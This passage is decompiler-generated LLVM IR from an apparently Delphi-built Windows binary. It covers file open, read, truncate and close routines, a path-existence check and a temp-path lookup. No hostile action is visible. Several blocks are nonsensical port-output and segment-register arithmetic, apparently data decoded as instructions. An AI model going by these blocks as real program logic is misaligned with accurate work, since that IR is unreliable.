  store i8 %41, i8* %37, align 1, !insn.addr !1581
  %42 = mul i32 %arg5, 2, !insn.addr !1582
  %43 = add i32 %arg2, 115, !insn.addr !1582
  %44 = add i32 %43, %42, !insn.addr !1582
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1582
  %46 = load i8, i8* %45, align 1, !insn.addr !1582
  %47 = trunc i32 %arg2 to i8, !insn.addr !1582
  %48 = add i8 %46, %47, !insn.addr !1582
  %49 = icmp eq i8 %48, 0, !insn.addr !1582
  store i8 %48, i8* %45, align 1, !insn.addr !1582
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1583
  br i1 %49, label %dec_label_pc_406847, label %dec_label_pc_406805, !insn.addr !1583

dec_label_pc_406805:                              ; preds = %dec_label_pc_4067f6
  %50 = icmp slt i8 %48, 0, !insn.addr !1582
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1584
  %52 = load i32, i32* %51, align 4, !insn.addr !1584
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1584
  br i1 %50, label %dec_label_pc_40687c, label %dec_label_pc_40680a, !insn.addr !1585

dec_label_pc_40680a:                              ; preds = %dec_label_pc_406805
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1586
  %55 = add i8 %54, -32, !insn.addr !1586
  %56 = icmp ult i8 %54, 32, !insn.addr !1586
  %57 = icmp eq i8 %55, 0, !insn.addr !1586
  %58 = zext i8 %55 to i32, !insn.addr !1586
  %59 = and i32 %53, -256, !insn.addr !1586
  %60 = or i32 %59, %58, !insn.addr !1586
  store i32 %60, i32* %eax, align 4, !insn.addr !1586
  %61 = or i1 %56, %57, !insn.addr !1587
  br i1 %61, label %dec_label_pc_40680e, label %dec_label_pc_40687d, !insn.addr !1587

dec_label_pc_40680e:                              ; preds = %dec_label_pc_40680a
  %62 = add i32 %arg2, 105, !insn.addr !1588
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1588
  %64 = load i8, i8* %63, align 1, !insn.addr !1588
  %65 = udiv i32 %53, 256, !insn.addr !1588
  %66 = trunc i32 %65 to i8, !insn.addr !1588
  %67 = and i8 %64, %66, !insn.addr !1588
  store i8 %67, i8* %63, align 1, !insn.addr !1588
  %68 = add i32 %arg6, 105, !insn.addr !1589
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1589
  %70 = load i8, i8* %69, align 1, !insn.addr !1589
  %71 = and i8 %70, %40, !insn.addr !1589
  store i8 %71, i8* %69, align 1, !insn.addr !1589
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1590
  %74 = load i8, i8* %73, align 1, !insn.addr !1590
  %75 = trunc i32 %72 to i8, !insn.addr !1590
  %76 = add i8 %74, %75, !insn.addr !1590
  store i8 %76, i8* %73, align 1, !insn.addr !1590
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1591
  %79 = load i8, i8* %78, align 1, !insn.addr !1591
  %80 = trunc i32 %77 to i8, !insn.addr !1591
  %81 = add i8 %79, %80, !insn.addr !1591
  store i8 %81, i8* %78, align 1, !insn.addr !1591
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1592
  %83 = load i32, i32* %82, align 4, !insn.addr !1592
  %84 = add i32 %83, %arg6, !insn.addr !1592
  store i32 %84, i32* %82, align 4, !insn.addr !1592
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1593
  %87 = load i8, i8* %86, align 1, !insn.addr !1593
  %88 = trunc i32 %85 to i8, !insn.addr !1593
  %89 = add i8 %87, %88, !insn.addr !1593
  store i8 %89, i8* %86, align 1, !insn.addr !1593
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1594
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1595
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1595
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1595
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1596
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1597
  %93 = add i32 %92, 1, !insn.addr !1597
  %94 = icmp eq i32 %93, 0, !insn.addr !1597
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1597
  %95 = icmp eq i1 %94, false, !insn.addr !1598
  br i1 %95, label %dec_label_pc_40683f, label %dec_label_pc_406835, !insn.addr !1598

dec_label_pc_406835:                              ; preds = %dec_label_pc_40680e
  %96 = call i32 @"@LStrClr"(), !insn.addr !1599
  br label %dec_label_pc_40683f, !insn.addr !1599

dec_label_pc_40683f:                              ; preds = %dec_label_pc_406835, %dec_label_pc_40680e
  store i32 0, i32* %eax, align 4, !insn.addr !1600
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1601
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1602
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1602
  br label %dec_label_pc_406847, !insn.addr !1602

dec_label_pc_406847:                              ; preds = %dec_label_pc_40683f, %dec_label_pc_4067f6
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1603
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1603
  store i32 4221012, i32* %99, align 4, !insn.addr !1603
  %100 = load i32, i32* %eax, align 4, !insn.addr !1604
  ret i32 %100, !insn.addr !1604

dec_label_pc_406865:                              ; preds = %dec_label_pc_4067ed
  %101 = mul i32 %4, 2, !insn.addr !1605
  %102 = add i32 %1, 105, !insn.addr !1605
  %103 = add i32 %102, %101, !insn.addr !1605
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1605
  %105 = load i32, i32* %104, align 4, !insn.addr !1605
  %106 = or i32 %105, %3, !insn.addr !1605
  store i32 %106, i32* %104, align 4, !insn.addr !1605
  %107 = add i32 %0, -1, !insn.addr !1606
  %108 = trunc i32 %3 to i16, !insn.addr !1607
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1607
  %110 = load i32, i32* %109, align 4, !insn.addr !1607
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1607
  %111 = load i32, i32* %eax, align 4, !insn.addr !1608
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1608
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1608
  %115 = or i8 %112, %114, !insn.addr !1608
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1608
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1609
  %118 = load i8, i8* %117, align 1, !insn.addr !1609
  %119 = trunc i32 %116 to i8, !insn.addr !1609
  %120 = add i8 %118, %119, !insn.addr !1609
  store i8 %120, i8* %117, align 1, !insn.addr !1609
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1610
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1610
  %124 = load i8, i8* %123, align 1, !insn.addr !1610
  %125 = add i8 %124, %122, !insn.addr !1610
  %126 = zext i8 %125 to i32, !insn.addr !1610
  %127 = and i32 %121, -256, !insn.addr !1610
  %128 = or i32 %127, %126, !insn.addr !1610
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1611
  %130 = load i8, i8* %129, align 1, !insn.addr !1611
  %131 = trunc i32 %3 to i8, !insn.addr !1612
  %132 = add i8 %125, %131, !insn.addr !1611
  %133 = add i8 %132, %130, !insn.addr !1612
  store i8 %133, i8* %129, align 1, !insn.addr !1612
  %134 = add i32 %128, 1, !insn.addr !1613
  store i32 %134, i32* %eax, align 4, !insn.addr !1613
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1614
  %136 = load i8, i8* %135, align 1, !insn.addr !1614
  %137 = trunc i32 %134 to i8, !insn.addr !1614
  %138 = add i8 %136, %137, !insn.addr !1614
  store i8 %138, i8* %135, align 1, !insn.addr !1614
  br label %dec_label_pc_40687c, !insn.addr !1614

dec_label_pc_40687c:                              ; preds = %dec_label_pc_406865, %dec_label_pc_406805
  %139 = load i32, i32* %eax, align 4, !insn.addr !1614
  ret i32 %139, !insn.addr !1614

dec_label_pc_40687d:                              ; preds = %dec_label_pc_40680a
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1615
  %141 = load i8, i8* %140, align 1, !insn.addr !1615
  %142 = add i8 %141, %55, !insn.addr !1615
  store i8 %142, i8* %140, align 1, !insn.addr !1615
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1616
  %145 = load i8, i8* %144, align 1, !insn.addr !1616
  %146 = trunc i32 %arg3 to i8, !insn.addr !1616
  %147 = add i8 %145, %146, !insn.addr !1616
  store i8 %147, i8* %144, align 1, !insn.addr !1616
  %148 = load i32, i32* %eax, align 4, !insn.addr !1617
  %149 = add i32 %148, 1, !insn.addr !1617
  %150 = mul i32 %149, 2, !insn.addr !1618
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1618
  %152 = load i8, i8* %151, align 2, !insn.addr !1618
  %153 = trunc i32 %149 to i8, !insn.addr !1618
  %154 = add i8 %152, %153, !insn.addr !1618
  store i8 %154, i8* %151, align 2, !insn.addr !1618
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1619
  %156 = load i8, i8* %155, align 1, !insn.addr !1619
  %157 = add i8 %156, %153, !insn.addr !1619
  store i8 %157, i8* %155, align 1, !insn.addr !1619
  ret i32 %149, !insn.addr !1620
}

define i32 @function_40689b() local_unnamed_addr {
dec_label_pc_40689b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1621
}

define i32 @function_4068a8() local_unnamed_addr {
dec_label_pc_4068a8:
  %esp.1.reg2mem = alloca i32, !insn.addr !1622
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1623
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1623
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1623
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1624
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1625
  %3 = call i32 @function_4036c8(), !insn.addr !1626
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1627
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1627
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1627
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1628
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1629
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1630
  br i1 %7, label %dec_label_pc_406a47, label %dec_label_pc_406912, !insn.addr !1630

dec_label_pc_406912:                              ; preds = %dec_label_pc_4068a8
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1628
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1631
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1631
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1632
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1633
  br i1 %12, label %dec_label_pc_406a47, label %dec_label_pc_40692e, !insn.addr !1633

dec_label_pc_40692e:                              ; preds = %dec_label_pc_406912
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1634
  %14 = call i32 @function_403720(), !insn.addr !1635
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1636
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1636
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1637
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1637
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1638
  %19 = call i32 @function_4046d4(), !insn.addr !1639
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406a47

dec_label_pc_406a47:                              ; preds = %dec_label_pc_40692e, %dec_label_pc_406912, %dec_label_pc_4068a8
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1640
  %21 = load i32, i32* %20, align 4, !insn.addr !1640
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1641
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1642
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1642
  store i32 4221545, i32* %23, align 4, !insn.addr !1642
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1643
  ret i32 %24, !insn.addr !1644
}

define i32 @function_406a62() local_unnamed_addr {
dec_label_pc_406a62:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1645
  ret i32 %0, !insn.addr !1645
}

define i32 @function_406a67() local_unnamed_addr {
dec_label_pc_406a67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1646
}

define i32 @function_406a69(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a69:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1647
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1647
  %3 = load i32, i32* %2, align 4, !insn.addr !1647
  ret i32 %3, !insn.addr !1648
}

define i32 @function_406aa0() local_unnamed_addr {
dec_label_pc_406aa0:
  %esp.2.reg2mem = alloca i32, !insn.addr !1649
  %esp.1.reg2mem = alloca i32, !insn.addr !1649
  %esi.0.reg2mem = alloca i32, !insn.addr !1649
  %esp.0.reg2mem = alloca i32, !insn.addr !1649
  %ebx.0.reg2mem = alloca i32, !insn.addr !1649
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1650
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1651
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1651
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1651
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1652
  %2 = call i32 @function_403c88(), !insn.addr !1653
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1654
  br i1 %3, label %dec_label_pc_406b89, label %dec_label_pc_406ace, !insn.addr !1654

dec_label_pc_406ace:                              ; preds = %dec_label_pc_406aa0
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1655
  %5 = call i32 @function_4036c8(), !insn.addr !1656
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1657
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1657
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1657
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1658
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1659
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1660
  br i1 %9, label %dec_label_pc_406b89, label %dec_label_pc_406b0a, !insn.addr !1660

dec_label_pc_406b0a:                              ; preds = %dec_label_pc_406ace
  %10 = call i32 @"@LStrClr"(), !insn.addr !1661
  %11 = call i32 @function_403c90(), !insn.addr !1662
  %12 = icmp slt i32 %11, 0, !insn.addr !1663
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1664
  br i1 %12, label %dec_label_pc_406b54, label %dec_label_pc_406b22, !insn.addr !1664

dec_label_pc_406b22:                              ; preds = %dec_label_pc_406b0a
  %13 = add i32 %11, 1, !insn.addr !1665
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1666
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1666
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1666
  br label %dec_label_pc_406b25, !insn.addr !1666

dec_label_pc_406b25:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b22
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1667
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1667
  store i32 0, i32* %15, align 4, !insn.addr !1667
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1668
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1669
  %18 = add i32 %16, %17, !insn.addr !1669
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1669
  %20 = load i32, i32* %19, align 4, !insn.addr !1669
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1669
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1669
  store i32 %20, i32* %22, align 4, !insn.addr !1669
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1670
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1670
  store i32 ptrtoint (i32* @global_var_406bd0 to i32), i32* %24, align 4, !insn.addr !1670
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1671
  %26 = or i32 %17, 4, !insn.addr !1672
  %27 = add i32 %25, %26, !insn.addr !1672
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1672
  %29 = load i32, i32* %28, align 4, !insn.addr !1672
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1672
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1672
  store i32 %29, i32* %31, align 4, !insn.addr !1672
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1673
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1673
  store i32 ptrtoint ([3 x i8]* @global_var_406bdc to i32), i32* %33, align 4, !insn.addr !1673
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1674
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1675
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1676
  %37 = icmp eq i32 %36, 0, !insn.addr !1676
  %38 = icmp eq i1 %37, false, !insn.addr !1677
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1677
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1677
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1677
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1677
  br i1 %38, label %dec_label_pc_406b25, label %dec_label_pc_406b54, !insn.addr !1677

dec_label_pc_406b54:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b0a
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1658
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1678
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1679
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1679
  store i32 0, i32* %42, align 4, !insn.addr !1679
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1680
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1680
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1680
  store i32 %45, i32* %44, align 4, !insn.addr !1680
  %46 = call i32 @function_4034c8(), !insn.addr !1681
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1682
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1682
  store i32 %46, i32* %48, align 4, !insn.addr !1682
  %49 = call i32 @function_403720(), !insn.addr !1683
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1684
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1684
  store i32 %49, i32* %51, align 4, !insn.addr !1684
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1685
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1685
  store i32 %39, i32* %53, align 4, !insn.addr !1685
  %54 = call i32 @function_40446c(), !insn.addr !1686
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1687
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1687
  store i32 %39, i32* %56, align 4, !insn.addr !1687
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1688
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1689
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1689
  store i32 %39, i32* %59, align 4, !insn.addr !1689
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1690
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1691
  br label %dec_label_pc_406b89, !insn.addr !1691

dec_label_pc_406b89:                              ; preds = %dec_label_pc_406b54, %dec_label_pc_406ace, %dec_label_pc_406aa0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1692
  %62 = load i32, i32* %61, align 4, !insn.addr !1692
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1693
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1694
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1694
  store i32 4221867, i32* %64, align 4, !insn.addr !1694
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1695
  ret i32 %65, !insn.addr !1696
}

define i32 @function_406ba4() local_unnamed_addr {
dec_label_pc_406ba4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1697
  ret i32 %0, !insn.addr !1697
}

define i32 @function_406ba9() local_unnamed_addr {
dec_label_pc_406ba9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1698
}

define i32 @function_406bab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1699
}

define i32 @function_406be0() local_unnamed_addr {
dec_label_pc_406be0:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1700
  %1 = call i32 @function_4036b8(), !insn.addr !1701
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1702
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1702
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1702
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1703
  %4 = call i32 @function_403c90(), !insn.addr !1704
  %5 = icmp slt i32 %4, 0, !insn.addr !1705
  br i1 %5, label %dec_label_pc_406c68, label %dec_label_pc_406c36, !insn.addr !1706

dec_label_pc_406c36:                              ; preds = %dec_label_pc_406be0
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1707
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1708
  br label %dec_label_pc_406cb4

dec_label_pc_406c68:                              ; preds = %dec_label_pc_406be0
  %8 = call i32 @function_403c88(), !insn.addr !1709
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1710
  %10 = call i32 @function_403c90(), !insn.addr !1711
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1712
  %12 = call i32 @function_403c90(), !insn.addr !1713
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1714
  %14 = call i32 @function_406aa0(), !insn.addr !1715
  br label %dec_label_pc_406cb4, !insn.addr !1715

dec_label_pc_406cb4:                              ; preds = %dec_label_pc_406c36, %dec_label_pc_406c68
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1716
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1717
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1718
  ret i32 %16, !insn.addr !1719
}

define i32 @function_406ccf() local_unnamed_addr {
dec_label_pc_406ccf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1720
  ret i32 %0, !insn.addr !1720
}

define i32 @function_406cd4() local_unnamed_addr {
dec_label_pc_406cd4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1721
}

define i32 @function_406cd6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406cd6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1722
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1722
  %3 = load i32, i32* %2, align 4, !insn.addr !1722
  ret i32 %3, !insn.addr !1723
}

define i32 @function_406ce0() local_unnamed_addr {
dec_label_pc_406ce0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1724
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1724
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1724
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1725
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1726
  %3 = add i32 %2, 1, !insn.addr !1726
  %4 = icmp eq i32 %3, 0, !insn.addr !1726
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1726
  %5 = icmp eq i1 %4, false, !insn.addr !1727
  br i1 %5, label %dec_label_pc_406d18, label %dec_label_pc_406cf9, !insn.addr !1727

dec_label_pc_406cf9:                              ; preds = %dec_label_pc_406ce0
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1728
  %7 = icmp eq i32 %6, 0, !insn.addr !1728
  br i1 %7, label %dec_label_pc_406d08, label %dec_label_pc_406d03, !insn.addr !1729

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cf9
  %8 = call i32 @function_406aa0(), !insn.addr !1730
  br label %dec_label_pc_406d08, !insn.addr !1730

dec_label_pc_406d08:                              ; preds = %dec_label_pc_406d03, %dec_label_pc_406cf9
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1731
  br label %dec_label_pc_406d18, !insn.addr !1731

dec_label_pc_406d18:                              ; preds = %dec_label_pc_406d08, %dec_label_pc_406ce0
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1732
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1733
  ret i32 0, !insn.addr !1734
}

define i32 @function_406d26() local_unnamed_addr {
dec_label_pc_406d26:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1735
  ret i32 %0, !insn.addr !1735
}

define i32 @function_406d2b() local_unnamed_addr {
dec_label_pc_406d2b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1736
}

define i32 @function_406d2d(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1737
}

define i32 @function_406d30() local_unnamed_addr {
dec_label_pc_406d30:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1738
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1738
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1738
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1739
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1740
  %3 = add i32 %2, -1, !insn.addr !1740
  %4 = icmp eq i32 %2, 0, !insn.addr !1740
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1740
  %5 = icmp eq i1 %4, false, !insn.addr !1741
  br i1 %5, label %dec_label_pc_406d64, label %dec_label_pc_406d4a, !insn.addr !1741

dec_label_pc_406d4a:                              ; preds = %dec_label_pc_406d30
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1742
  br label %dec_label_pc_406d64, !insn.addr !1743

dec_label_pc_406d64:                              ; preds = %dec_label_pc_406d4a, %dec_label_pc_406d30
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1744
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1745
  ret i32 0, !insn.addr !1746
}

define i32 @function_406d72() local_unnamed_addr {
dec_label_pc_406d72:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1747
  ret i32 %0, !insn.addr !1747
}

define i32 @function_406d77() local_unnamed_addr {
dec_label_pc_406d77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1748
}

define i32 @function_406d79(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d79:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1749
}

define i1 @function_406d7c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406d7c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1750
  ret i1 %0, !insn.addr !1750
}

define i32 @function_406d84() local_unnamed_addr {
dec_label_pc_406d84:
  %eax.0.reg2mem = alloca i32, !insn.addr !1751
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1752
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1753
  %2 = icmp eq i32 %1, 0, !insn.addr !1754
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1755
  br i1 %2, label %dec_label_pc_406dba, label %dec_label_pc_406d9c, !insn.addr !1755

